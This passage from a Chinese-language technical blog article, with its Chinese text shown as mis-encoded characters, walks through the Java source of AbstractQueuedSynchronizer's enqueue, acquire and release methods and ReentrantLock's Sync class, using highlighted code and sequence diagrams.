        <span class="hljs-keyword">if</span> (compareAndSetState(<span class="hljs-number">0</span>, acquires)) {
            setExclusiveOwnerThread(current);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
    }
    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (current == getExclusiveOwnerThread()) {
        <span class="hljs-comment">// å½“å‰çº¿ç¨‹å·²æŒæœ‰é”ï¼Œé‡å…¥</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">nextc</span> <span class="hljs-operator">=</span> c + acquires;
        <span class="hljs-keyword">if</span> (nextc &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">// overflow</span>
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"Maximum lock count exceeded"</span>);
        setState(nextc);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<h4 data-id="heading-53">5.3 addWaiter - åˆ›å»ºèŠ‚ç‚¹å…¥é˜Ÿ</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> Node <span class="hljs-title function_">addWaiter</span><span class="hljs-params">(Node mode)</span> {
    <span class="hljs-comment">// åˆ›å»ºæ–°èŠ‚ç‚¹</span>
    <span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(Thread.currentThread(), mode);
    
    <span class="hljs-comment">// å¿«é€Ÿè·¯å¾„ï¼šå°è¯•ç›´æ¥æŒ‚åˆ°é˜Ÿå°¾</span>
    <span class="hljs-type">Node</span> <span class="hljs-variable">pred</span> <span class="hljs-operator">=</span> tail;
    <span class="hljs-keyword">if</span> (pred != <span class="hljs-literal">null</span>) {
        node.prev = pred;
        <span class="hljs-keyword">if</span> (compareAndSetTail(pred, node)) {
            pred.next = node;
            <span class="hljs-keyword">return</span> node;
        }
    }
    
    <span class="hljs-comment">// å¿«é€Ÿè·¯å¾„å¤±è´¥ï¼Œè¿›å…¥å®Œæ•´å…¥é˜Ÿæµç¨‹</span>
    enq(node);
    <span class="hljs-keyword">return</span> node;
}

<span class="hljs-keyword">private</span> Node <span class="hljs-title function_">enq</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Node node)</span> {
    <span class="hljs-keyword">for</span> (;;) {
        <span class="hljs-type">Node</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> tail;
        <span class="hljs-keyword">if</span> (t == <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// é˜Ÿåˆ—ä¸ºç©ºï¼Œåˆå§‹åŒ–ï¼ˆåˆ›å»ºå“¨å…µèŠ‚ç‚¹ï¼‰</span>
            <span class="hljs-keyword">if</span> (compareAndSetHead(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>()))
                tail = head;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// å°†èŠ‚ç‚¹æŒ‚åˆ°é˜Ÿå°¾</span>
            node.prev = t;
            <span class="hljs-keyword">if</span> (compareAndSetTail(t, node)) {
                t.next = node;
                <span class="hljs-keyword">return</span> t;
            }
        }
    }
}
</code></pre>
<p><strong>å…¥é˜Ÿè¿‡ç¨‹å›¾è§£</strong>ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant T as å½“å‰çº¿ç¨‹
    participant AQS as AQSé˜Ÿåˆ—
    
    T-&gt;&gt;AQS: addWaiter(EXCLUSIVE)
    
    alt é˜Ÿåˆ—ä¸ä¸ºç©º
        T-&gt;&gt;AQS: node.prev = tail
        T-&gt;&gt;AQS: CASè®¾ç½®tail
        T-&gt;&gt;AQS: oldTail.next = node
    else é˜Ÿåˆ—ä¸ºç©º
        T-&gt;&gt;AQS: CASè®¾ç½®head(å“¨å…µ)
        T-&gt;&gt;AQS: tail = head
        T-&gt;&gt;AQS: å†æ¬¡å¾ªç¯å…¥é˜Ÿ
    end
    
    AQS--&gt;&gt;T: è¿”å›node
</code></pre>
<h4 data-id="heading-54">5.4 acquireQueued - æ’é˜Ÿè·å–é”</h4>
<p>è¿™æ˜¯æœ€æ ¸å¿ƒçš„æ–¹æ³•ï¼Œçº¿ç¨‹åœ¨é˜Ÿåˆ—ä¸­è‡ªæ—‹æˆ–é˜»å¡ï¼Œç›´åˆ°è·å–åˆ°é”ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">acquireQueued</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Node node, <span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-type">boolean</span> <span class="hljs-variable">failed</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
    <span class="hljs-keyword">try</span> {
        <span class="hljs-type">boolean</span> <span class="hljs-variable">interrupted</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">for</span> (;;) {
            <span class="hljs-comment">// è·å–å‰é©±èŠ‚ç‚¹</span>
            <span class="hljs-keyword">final</span> <span class="hljs-type">Node</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> node.predecessor();
            
            <span class="hljs-comment">// å¦‚æœå‰é©±æ˜¯headï¼Œè¯´æ˜å½“å‰èŠ‚ç‚¹æ˜¯ç¬¬ä¸€ä¸ªç­‰å¾…è€…ï¼Œå°è¯•è·å–é”</span>
            <span class="hljs-keyword">if</span> (p == head &amp;&amp; tryAcquire(arg)) {
                <span class="hljs-comment">// è·å–æˆåŠŸï¼Œå°†å½“å‰èŠ‚ç‚¹è®¾ä¸ºhead</span>
                setHead(node);
                p.next = <span class="hljs-literal">null</span>; <span class="hljs-comment">// help GC</span>
                failed = <span class="hljs-literal">false</span>;
                <span class="hljs-keyword">return</span> interrupted;
            }
            
            <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦éœ€è¦é˜»å¡</span>
            <span class="hljs-keyword">if</span> (shouldParkAfterFailedAcquire(p, node) &amp;&amp;
                parkAndCheckInterrupt())
                interrupted = <span class="hljs-literal">true</span>;
        }
    } <span class="hljs-keyword">finally</span> {
        <span class="hljs-keyword">if</span> (failed)
            cancelAcquire(node);
    }
}
</code></pre>
<p><strong>acquireQueuedæµç¨‹å›¾</strong>ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79781ba17c8a4eb5a3aaa97354434238~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=YMWib8lnPNED%2FMpVUgBwIcMazf0%3D" alt="acquireQueued-flow.drawio.png" loading="lazy"/></p>
<h4 data-id="heading-55">5.5 shouldParkAfterFailedAcquire - æ˜¯å¦é˜»å¡</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">shouldParkAfterFailedAcquire</span><span class="hljs-params">(Node pred, Node node)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">ws</span> <span class="hljs-operator">=</span> pred.waitStatus;
    
    <span class="hljs-keyword">if</span> (ws == Node.SIGNAL)
        <span class="hljs-comment">// å‰é©±çŠ¶æ€æ­£å¸¸ï¼Œå½“å‰çº¿ç¨‹å¯ä»¥å®‰å…¨é˜»å¡</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        
    <span class="hljs-keyword">if</span> (ws &gt; <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// å‰é©±å·²å–æ¶ˆï¼Œè·³è¿‡æ‰€æœ‰å·²å–æ¶ˆçš„èŠ‚ç‚¹</span>
        <span class="hljs-keyword">do</span> {
            node.prev = pred = pred.prev;
        } <span class="hljs-keyword">while</span> (pred.waitStatus &gt; <span class="hljs-number">0</span>);
        pred.next = node;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// å°†å‰é©±çŠ¶æ€è®¾ä¸ºSIGNAL</span>
        <span class="hljs-comment">// ä¸‹æ¬¡å¾ªç¯ä¼šè¿”å›true</span>
        compareAndSetWaitStatus(pred, ws, Node.SIGNAL);
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆä¸ç›´æ¥é˜»å¡ï¼Œè€Œæ˜¯å…ˆè®¾ç½®å‰é©±ä¸ºSIGNALï¼Ÿ</strong></p>
<p>è¿™æ˜¯ä¸ºäº†ç¡®ä¿å½“å‰èŠ‚ç‚¹é˜»å¡åèƒ½è¢«æ­£ç¡®å”¤é†’ã€‚å¦‚æœç›´æ¥é˜»å¡ï¼Œè€Œå‰é©±çš„waitStatusä¸æ˜¯SIGNALï¼Œé‚£ä¹ˆå‰é©±é‡Šæ”¾é”æ—¶ä¸ä¼šå”¤é†’å½“å‰èŠ‚ç‚¹ï¼Œå¯¼è‡´æ°¸ä¹…é˜»å¡ã€‚</p>
<h4 data-id="heading-56">5.6 parkAndCheckInterrupt - é˜»å¡çº¿ç¨‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">parkAndCheckInterrupt</span><span class="hljs-params">()</span> {
    LockSupport.park(<span class="hljs-built_in">this</span>);  <span class="hljs-comment">// é˜»å¡å½“å‰çº¿ç¨‹</span>
    <span class="hljs-keyword">return</span> Thread.interrupted();  <span class="hljs-comment">// è¿”å›å¹¶æ¸…é™¤ä¸­æ–­çŠ¶æ€</span>
}
</code></pre>
<p><code>LockSupport.park()</code>ä¼šé˜»å¡å½“å‰çº¿ç¨‹ï¼Œç›´åˆ°ä»¥ä¸‹æƒ…å†µä¹‹ä¸€å‘ç”Ÿï¼š</p>
<ol>
<li>å…¶ä»–çº¿ç¨‹è°ƒç”¨<code>unpark()</code>å”¤é†’</li>
<li>çº¿ç¨‹è¢«ä¸­æ–­</li>
<li>è™šå‡å”¤é†’ï¼ˆspurious wakeupï¼‰</li>
</ol>
<hr/>
<h3 data-id="heading-57">6. ç‹¬å æ¨¡å¼é‡Šæ”¾é”</h3>
<h4 data-id="heading-58">6.1 releaseæµç¨‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">release</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-keyword">if</span> (tryRelease(arg)) {
        <span class="hljs-type">Node</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> head;
        <span class="hljs-keyword">if</span> (h != <span class="hljs-literal">null</span> &amp;&amp; h.waitStatus != <span class="hljs-number">0</span>)
            unparkSuccessor(h);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/056cadc2d6124d639b78598b80821355~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=bynkFvfLwXN%2FO736%2BAZhLsJkpiQ%3D" alt="release-flow.drawio.png" loading="lazy"/></p>
<h4 data-id="heading-59">6.2 tryRelease - å­ç±»å®ç°</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ReentrantLock.Sync.tryRelease</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryRelease</span><span class="hljs-params">(<span class="hljs-type">int</span> releases)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> getState() - releases;
    
    <span class="hljs-comment">// åªæœ‰é”æŒæœ‰è€…æ‰èƒ½é‡Šæ”¾</span>
    <span class="hljs-keyword">if</span> (Thread.currentThread() != getExclusiveOwnerThread())
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalMonitorStateException</span>();
    
    <span class="hljs-type">boolean</span> <span class="hljs-variable">free</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">if</span> (c == <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// stateå‡åˆ°0ï¼Œå®Œå…¨é‡Šæ”¾</span>
        free = <span class="hljs-literal">true</span>;
        setExclusiveOwnerThread(<span class="hljs-literal">null</span>);
    }
    setState(c);
    <span class="hljs-keyword">return</span> free;
}
</code></pre>
<h4 data-id="heading-60">6.3 unparkSuccessor - å”¤é†’åç»§</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unparkSuccessor</span><span class="hljs-params">(Node node)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">ws</span> <span class="hljs-operator">=</span> node.waitStatus;
    <span class="hljs-keyword">if</span> (ws &lt; <span class="hljs-number">0</span>)
        compareAndSetWaitStatus(node, ws, <span class="hljs-number">0</span>);
    
    <span class="hljs-comment">// æ‰¾åˆ°éœ€è¦å”¤é†’çš„åç»§èŠ‚ç‚¹</span>
    <span class="hljs-type">Node</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> node.next;
    <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">null</span> || s.waitStatus &gt; <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// nextä¸ºç©ºæˆ–å·²å–æ¶ˆï¼Œä»tailå‘å‰æ‰¾</span>
        s = <span class="hljs-literal">null</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-type">Node</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> tail; t != <span class="hljs-literal">null</span> &amp;&amp; t != node; t = t.prev)
            <span class="hljs-keyword">if</span> (t.waitStatus &lt;= <span class="hljs-number">0</span>)
                s = t;
    }
    
    <span class="hljs-keyword">if</span> (s != <span class="hljs-literal">null</span>)
        LockSupport.unpark(s.thread);  <span class="hljs-comment">// å”¤é†’çº¿ç¨‹</span>
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆè¦ä»tailå‘å‰æ‰¾ï¼Ÿ</strong></p>
<p>å› ä¸ºåœ¨<code>addWaiter</code>ä¸­ï¼Œè®¾ç½®<code>prev</code>æŒ‡é’ˆå’Œ<code>next</code>æŒ‡é’ˆä¸æ˜¯åŸå­æ“ä½œï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// addWaiterä¸­çš„ä»£ç </span>
node.prev = pred;               <span class="hljs-comment">// â‘  å…ˆè®¾ç½®prev</span>
<span class="hljs-keyword">if</span> (compareAndSetTail(pred, node)) {
    pred.next = node;           <span class="hljs-comment">// â‘¡ åè®¾ç½®next</span>
    <span class="hljs-keyword">return</span> node;
}
</code></pre>
<p>åœ¨â‘ å’Œâ‘¡ä¹‹é—´ï¼Œå¦‚æœå‘ç”Ÿå¹¶å‘æ“ä½œï¼Œä»headå‘åéå†å¯èƒ½æ‰¾ä¸åˆ°æ–°å…¥é˜Ÿçš„èŠ‚ç‚¹ï¼Œä½†ä»tailå‘å‰éå†ä¸€å®šèƒ½æ‰¾åˆ°ã€‚</p>
<h4 data-id="heading-61">6.4 å®Œæ•´çš„åŠ é”-é‡Šæ”¾é”æµç¨‹</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant T1 as çº¿ç¨‹1
    participant T2 as çº¿ç¨‹2
    participant AQS as AQS
    
    Note over AQS: state=0, head=tail=null
    
    T1-&gt;&gt;AQS: lock() -&gt; acquire(1)
    AQS-&gt;&gt;AQS: tryAcquire(1): state 0-&gt;1
    Note over AQS: state=1, owner=T1
    AQS--&gt;&gt;T1: è·å–æˆåŠŸ
    
    T2-&gt;&gt;AQS: lock() -&gt; acquire(1)
    AQS-&gt;&gt;AQS: tryAcquire(1): å¤±è´¥
    AQS-&gt;&gt;AQS: addWaiter(EXCLUSIVE)
    Note over AQS: åˆ›å»ºheadå“¨å…µå’ŒT2èŠ‚ç‚¹
    AQS-&gt;&gt;AQS: acquireQueued()
    AQS-&gt;&gt;AQS: park(T2)
    Note over T2: é˜»å¡ç­‰å¾…
    
    T1-&gt;&gt;AQS: unlock() -&gt; release(1)
    AQS-&gt;&gt;AQS: tryRelease(1): state 1-&gt;0
    Note over AQS: state=0, owner=null
    AQS-&gt;&gt;AQS: unparkSuccessor(head)
    AQS-&gt;&gt;T2: unpark(T2)
    
    Note over T2: è¢«å”¤é†’
    T2-&gt;&gt;AQS: ç»§ç»­acquireQueuedå¾ªç¯
    AQS-&gt;&gt;AQS: tryAcquire(1): state 0-&gt;1
    Note over AQS: state=1, owner=T2
    AQS--&gt;&gt;T2: è·å–æˆåŠŸ
</code></pre>
<h2 data-id="heading-62">ç¬¬ä¸‰ç« ï¼šReentrantLock æºç æ·±åº¦å‰–æ</h2>
<h3 data-id="heading-63">1. ç±»ç»“æ„è®¾è®¡</h3>
<h4 data-id="heading-64">1.1 æ•´ä½“ç»“æ„</h4>
<p>ReentrantLocké‡‡ç”¨<strong>ç»„åˆæ¨¡å¼</strong>ï¼Œé€šè¿‡å†…éƒ¨ç±»<code>Sync</code>åŠå…¶å­ç±»å®ç°é”çš„æ ¸å¿ƒé€»è¾‘ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReentrantLock</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Lock</span>, java.io.Serializable {
    
    <span class="hljs-comment">/** åŒæ­¥å™¨ï¼Œæä¾›æ‰€æœ‰å®ç°æœºåˆ¶ */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Sync sync;
    
    <span class="hljs-comment">/** åŒæ­¥å™¨åŸºç±» */</span>
    <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQueuedSynchronizer</span> { ... }
    
    <span class="hljs-comment">/** éå…¬å¹³é”å®ç° */</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NonfairSync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Sync</span> { ... }
    
    <span class="hljs-comment">/** å…¬å¹³é”å®ç° */</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FairSync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Sync</span> { ... }
    
    <span class="hljs-comment">// æ„é€ æ–¹æ³•</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ReentrantLock</span><span class="hljs-params">()</span> {
        sync = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NonfairSync</span>();  <span class="hljs-comment">// é»˜è®¤éå…¬å¹³é”</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ReentrantLock</span><span class="hljs-params">(<span class="hljs-type">boolean</span> fair)</span> {
        sync = fair ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">FairSync</span>() : <span class="hljs-keyword">new</span> <span class="hljs-title class_">NonfairSync</span>();
    }
}
</code></pre>
<h4 data-id="heading-65">1.2 ç±»å›¾</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/598b1c2cc6a64a7a93cfcf79bf0814e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=8zhIUzPfRigb7LF7jbRldU7yeHQ%3D" alt="reentrantlock-detailed-class-diagram.drawio.png" loading="lazy"/></p>
<h4 data-id="heading-66">1.3 è®¾è®¡äº®ç‚¹</h4>
<ol>
<li><strong>ç­–ç•¥æ¨¡å¼</strong>ï¼šé€šè¿‡<code>Sync</code>å­ç±»åˆ‡æ¢å…¬å¹³/éå…¬å¹³ç­–ç•¥</li>
<li><strong>æ¨¡æ¿æ–¹æ³•</strong>ï¼šç»§æ‰¿AQSï¼Œåªé‡å†™<code>tryAcquire</code>å’Œ<code>tryRelease</code></li>
<li><strong>ç»„åˆä¼˜äºç»§æ‰¿</strong>ï¼šReentrantLockç»„åˆSyncï¼Œè€Œéç›´æ¥ç»§æ‰¿AQS</li>
<li><strong>å†…éƒ¨ç±»å°è£…</strong>ï¼šSyncç±»å¯¹å¤–ä¸å¯è§ï¼Œéšè—å®ç°ç»†èŠ‚</li>
</ol>
<hr/>
<h3 data-id="heading-67">2. SyncæŠ½è±¡ç±»</h3>
<h4 data-id="heading-68">2.1 æ ¸å¿ƒæ–¹æ³•æ¦‚è§ˆ</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQueuedSynchronizer</span> {
    
    <span class="hljs-comment">/** è·å–é”ï¼Œç”±å­ç±»å®ç°ä¸åŒç­–ç•¥ */</span>
    <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">()</span>;
    
    <span class="hljs-comment">/** éå…¬å¹³tryAcquireï¼Œå…¬å¹³é”å’Œéå…¬å¹³é”çš„tryLock()éƒ½ç”¨å®ƒ */</span>
    <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">nonfairTryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> { ... }
    
    <span class="hljs-comment">/** é‡Šæ”¾é”ï¼Œå…¬å¹³å’Œéå…¬å¹³é€»è¾‘ç›¸åŒ */</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryRelease</span><span class="hljs-params">(<span class="hljs-type">int</span> releases)</span> { ... }
    
    <span class="hljs-comment">/** åˆ¤æ–­å½“å‰çº¿ç¨‹æ˜¯å¦æŒæœ‰é” */</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isHeldExclusively</span><span class="hljs-params">()</span> { ... }
    
    <span class="hljs-comment">/** åˆ›å»ºæ¡ä»¶å˜é‡ */</span>
    <span class="hljs-keyword">final</span> ConditionObject <span class="hljs-title function_">newCondition</span><span class="hljs-params">()</span> { ... }
    
    <span class="hljs-comment">// è¾…åŠ©æ–¹æ³•</span>
    <span class="hljs-keyword">final</span> Thread <span class="hljs-title function_">getOwner</span><span class="hljs-params">()</span> { ... }
    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getHoldCount</span><span class="hljs-params">()</span> { ... }
    <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isLocked</span><span class="hljs-params">()</span> { ... }
}
</code></pre>
<h4 data-id="heading-69">2.2 nonfairTryAcquire - éå…¬å¹³è·å–é”</h4>
<p>è¿™æ˜¯ReentrantLockçš„æ ¸å¿ƒæ–¹æ³•ï¼Œå®ç°äº†éå…¬å¹³çš„é”è·å–é€»è¾‘ã€‚å…¬å¹³é”å’Œéå…¬å¹³é”çš„<code>tryLock()</code>æ–¹æ³•éƒ½ä¼šè°ƒç”¨å®ƒï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * éå…¬å¹³åœ°å°è¯•è·å–é”
 * <span class="hljs-doctag">@param</span> acquires è·å–æ•°é‡ï¼ˆé€šå¸¸ä¸º1ï¼‰
 * <span class="hljs-doctag">@return</span> æ˜¯å¦è·å–æˆåŠŸ
 */</span>
<span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">nonfairTryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
    <span class="hljs-keyword">final</span> <span class="hljs-type">Thread</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> Thread.currentThread();
    <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> getState();
    
    <span class="hljs-comment">// â‘  é”ç©ºé—²</span>
    <span class="hljs-keyword">if</span> (c == <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// ç›´æ¥CASå°è¯•è·å–ï¼Œä¸æ£€æŸ¥é˜Ÿåˆ—ï¼ˆéå…¬å¹³ï¼‰</span>
        <span class="hljs-keyword">if</span> (compareAndSetState(<span class="hljs-number">0</span>, acquires)) {
            setExclusiveOwnerThread(current);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
    }
    <span class="hljs-comment">// â‘¡ å½“å‰çº¿ç¨‹å·²æŒæœ‰é”ï¼ˆé‡å…¥ï¼‰</span>
    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (current == getExclusiveOwnerThread()) {
        <span class="hljs-type">int</span> <span class="hljs-variable">nextc</span> <span class="hljs-operator">=</span> c + acquires;
        <span class="hljs-comment">// æº¢å‡ºæ£€æŸ¥ï¼ˆæœ€å¤§é‡å…¥æ¬¡æ•°çº¦21äº¿ï¼‰</span>
        <span class="hljs-keyword">if</span> (nextc &lt; <span class="hljs-number">0</span>)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"Maximum lock count exceeded"</span>);
        setState(nextc);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    
    <span class="hljs-comment">// â‘¢ é”è¢«å…¶ä»–çº¿ç¨‹æŒæœ‰</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<p><strong>æ‰§è¡Œæµç¨‹</strong>ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/14e49893513c4eaeb61bce7153ab3e0c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=fxChheAr6lOFmI4c4vo5NiL5sW0%3D" alt="nonfairTryAcquire-flow.drawio.png" loading="lazy"/></p>
<h4 data-id="heading-70">2.3 tryRelease - é‡Šæ”¾é”</h4>
<p>å…¬å¹³é”å’Œéå…¬å¹³é”çš„é‡Šæ”¾é€»è¾‘å®Œå…¨ç›¸åŒï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * å°è¯•é‡Šæ”¾é”
 * <span class="hljs-doctag">@param</span> releases é‡Šæ”¾æ•°é‡ï¼ˆé€šå¸¸ä¸º1ï¼‰
 * <span class="hljs-doctag">@return</span> æ˜¯å¦å®Œå…¨é‡Šæ”¾ï¼ˆstateå˜ä¸º0ï¼‰
 */</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryRelease</span><span class="hljs-params">(<span class="hljs-type">int</span> releases)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> getState() - releases;
    
    <span class="hljs-comment">// â‘  åªæœ‰é”æŒæœ‰è€…æ‰èƒ½é‡Šæ”¾</span>
    <span class="hljs-keyword">if</span> (Thread.currentThread() != getExclusiveOwnerThread())
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalMonitorStateException</span>();
    
    <span class="hljs-type">boolean</span> <span class="hljs-variable">free</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    
    <span class="hljs-comment">// â‘¡ stateå‡åˆ°0ï¼Œå®Œå…¨é‡Šæ”¾</span>
    <span class="hljs-keyword">if</span> (c == <span class="hljs-number">0</span>) {
        free = <span class="hljs-literal">true</span>;
        setExclusiveOwnerThread(<span class="hljs-literal">null</span>);
    }
    
    <span class="hljs-comment">// â‘¢ æ›´æ–°stateï¼ˆæ— éœ€CASï¼Œå› ä¸ºæ˜¯ç‹¬å çš„ï¼‰</span>
    setState(c);
    <span class="hljs-keyword">return</span> free;
}
</code></pre>
<p><strong>å…³é”®ç‚¹</strong>ï¼š</p>
<ul>
<li>åªæœ‰<code>state==0</code>æ—¶æ‰çœŸæ­£é‡Šæ”¾é”ï¼ˆè¿”å›trueï¼‰</li>
<li>é‡å…¥åœºæ™¯ä¸‹ï¼Œæ¯æ¬¡unlockåªå°†stateå‡1</li>
<li>ä¸éœ€è¦CASï¼Œå› ä¸ºåªæœ‰é”æŒæœ‰è€…æ‰èƒ½è°ƒç”¨</li>
</ul>
<h4 data-id="heading-71">2.4 isHeldExclusively - æ˜¯å¦ç‹¬å æŒæœ‰</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isHeldExclusively</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> getExclusiveOwnerThread() == Thread.currentThread();
}
</code></pre>
